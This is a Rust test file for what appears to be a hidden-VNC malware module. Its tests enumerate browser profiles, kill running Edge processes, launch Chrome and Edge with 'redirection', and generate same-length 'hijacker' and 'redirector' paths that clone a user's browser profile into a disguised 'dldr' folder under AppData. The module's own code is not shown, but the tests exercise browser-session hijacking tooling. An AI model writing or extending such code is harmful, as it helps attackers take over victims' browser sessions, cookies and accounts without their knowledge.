#[cfg(test)]

mod browser_tests {
    use vnc_module::{browsers_helper, generate_hijacker_paths, generate_redirector_paths, generate_same_length_replacement, last_path_element, launch_browser_helper, pop_last_path_element, setup_redirection_profile};
use win_utils::kill_module_processes;

    #[test]
    fn launch_chrome_no_redirection() {
        unsafe {
        launch_browser_helper(
             r"C:\Program Files\Google\Chrome\Application\chrome.exe".to_string(),
            r"C:\Users\user\AppData\Local\Google\Chrome\User Data\Default".to_string(),
            r"Default".to_string(),
          0);
        }
    }

    #[test]
    fn launch_chrome_with_redirection() {
                unsafe {
        launch_browser_helper(
             r"C:\Program Files\Google\Chrome\Application\chrome.exe".to_string(),
            r"C:\Users\user\AppData\Local\Google\Chrome\User Data\Default".to_string(),
            r"Default".to_string(),
          1);
        }
    }

    #[test]
    fn dest_test() {
        println!("{}",last_path_element("C:\\Users\\user\\AppData\\Local\\Microsoft\\dldr\\User Data"));
        println!("{}",pop_last_path_element("C:\\Users\\user\\AppData\\Local\\Microsoft\\dldr\\User Data"));
    }

    #[test]
    fn clone_profile_firefox() {
        
    }

    #[test]
    fn clone_profile_chrome() {

    }

    #[test]
    fn clone_profile_edge() {

        let module_path = r"C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe".to_string();
        let profile_path = r"C:\Users\user\AppData\Local\Microsoft\Edge\User Data\Default".to_string();
        let profile_name = r"Default".to_string();

        unsafe { kill_module_processes(&module_path) };

        let full_profile_path = if profile_path.ends_with(&profile_name) {
            profile_path.clone()   
        } else {
            format!("{}\\{}", profile_path, profile_name)
        };

        setup_redirection_profile(&full_profile_path);
    }

    #[test]
    fn hijacker_paths() {
        let profile_path = r"C:\Users\user\AppData\Local\Microsoft\Edge\User Data\Default";
        let result = generate_hijacker_paths(profile_path).unwrap();
        println!("{:?}",result);
    }

    #[test]
    fn redirector_paths() {
        let profile_path = r"C:\Users\user\AppData\Local\Microsoft\Edge\User Data\Default";
        let result = generate_redirector_paths(profile_path).unwrap();
        println!("{:?}",result);
    }

    #[test]
    fn launch_edge_no_redirection() {
                unsafe {
        launch_browser_helper(
             r"C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe".to_string(),
            r"C:\Users\user\AppData\Local\Microsoft\Edge\User Data\Default".to_string(),
            r"Default".to_string(),
          0);
        }
    }

    #[test]
    fn launch_edge_with_redirection() {
        unsafe {
        launch_browser_helper(
             r"C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe".to_string(),
            r"C:\Users\user\AppData\Local\Microsoft\Edge\User Data\Default".to_string(),
            r"Default".to_string(),
          1);
        }
    }

    #[test]
    fn enumerate_browser_profiles() {
        let profile_info_json = unsafe {browsers_helper()};
        println!("{}",profile_info_json);
    }

        #[test]
    fn test_generate_hijacker_paths_edge() {
        let profile_path = r"C:\Users\user\AppData\Local\Microsoft\Edge\User Data\Default";
        let result = generate_hijacker_paths(profile_path).unwrap();
        
        assert_eq!(result.src, r"C:\Users\user\AppData\Local\Microsoft\Edge\User Data");
        assert_eq!(result.dst, r"C:\Users\user\AppData\Local\Microsoft\dldr\User Data");
        
        assert_eq!(result.src.len(), result.dst.len());
    }
    
    #[test]
    fn test_generate_redirector_paths_edge() {
        let profile_path = r"C:\Users\user\AppData\Local\Microsoft\Edge\User Data\Default";
        let result = generate_redirector_paths(profile_path).unwrap();
        
        assert_eq!(result.to_redirect, r"C:\Users\user\AppData\Local\Microsoft\Edge");
        assert_eq!(result.redirect_to, r"C:\Users\user\AppData\Local\Microsoft\dldr");
        assert_eq!(result.redirect_to_replace, r"\Edge\");
        assert_eq!(result.redirect_replace_with, r"\dldr\");

        assert_eq!(result.redirect_to_replace.len(), result.redirect_replace_with.len());
    }
    
    #[test]
    fn test_generate_same_length_replacement() {
        assert_eq!(generate_same_length_replacement("Edge"), "dldr");
        assert_eq!(generate_same_length_replacement("Chrome"), "dldrdl");
        assert_eq!(generate_same_length_replacement("a"), "d");
        assert_eq!(generate_same_length_replacement(""), "");
    }
    
    #[test]
    fn test_hijacker_paths_chrome() {
        let profile_path = r"C:\Users\user\AppData\Local\Google\Chrome\User Data\Default";
        let result = generate_hijacker_paths(profile_path).unwrap();
        
        assert_eq!(result.src, r"C:\Users\user\AppData\Local\Google\Chrome\User Data");
        assert_eq!(result.dst, r"C:\Users\user\AppData\Local\Google\dldrdl\User Data");
        assert_eq!(result.src.len(), result.dst.len());
    }
    
    #[test]
    fn test_redirector_paths_chrome() {
        let profile_path = r"C:\Users\user\AppData\Local\Google\Chrome\User Data\Default";
        let result = generate_redirector_paths(profile_path).unwrap();
        
        assert_eq!(result.to_redirect, r"C:\Users\user\AppData\Local\Google\Chrome");
        assert_eq!(result.redirect_to, r"C:\Users\user\AppData\Local\Google\dldrdl");
        assert_eq!(result.redirect_to_replace, r"\Chrome\");
        assert_eq!(result.redirect_replace_with, r"\dldrdl\");
    }
    
    #[test]
    fn test_insufficient_path_components() {
        assert!(generate_hijacker_paths(r"C:\short").is_none());
        assert!(generate_redirector_paths(r"C:\short").is_none());
    }
}